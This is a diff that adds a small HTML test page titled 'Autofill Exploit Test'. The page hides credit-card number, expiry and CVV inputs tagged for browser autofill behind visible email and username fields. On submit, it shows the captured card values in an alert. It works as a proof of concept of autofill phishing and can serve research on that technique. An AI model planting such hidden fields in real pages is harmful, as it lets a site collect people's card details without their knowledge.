@@ -1,0 +1,35 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Autofill Exploit Test</title>
+</head>
+<body>
+    <h2>Test Autofill</h2>
+    <form action="#" method="POST">
+        <!-- Visible Fields -->
+        <label for="email">Email:</label><br>
+        <input type="email" id="email" name="email" autocomplete="email"><br><br>
+
+        <label for="username">Username:</label><br>
+        <input type="text" id="username" name="username" autocomplete="username"><br><br>
+
+        <!-- Hidden Fields -->
+        <input type="text" id="card_number" name="card_number" autocomplete="cc-number" style="display:none;">
+        <input type="text" id="expiry" name="expiry" autocomplete="cc-exp" style="display:none;">
+        <input type="text" id="cvv" name="cvv" autocomplete="cc-csc" style="display:none;">
+
+        <button type="submit">Submit</button>
+    </form>
+
+    <script>
+        document.querySelector('form').addEventListener('submit', function(event) {
+            event.preventDefault();
+            alert("Card Number: " + document.getElementById('card_number').value + "\n" +
+                  "Expiry: " + document.getElementById('expiry').value + "\n" +
+                  "CVV: " + document.getElementById('cvv').value);
+        });
+    </script>
+</body>
+</html>
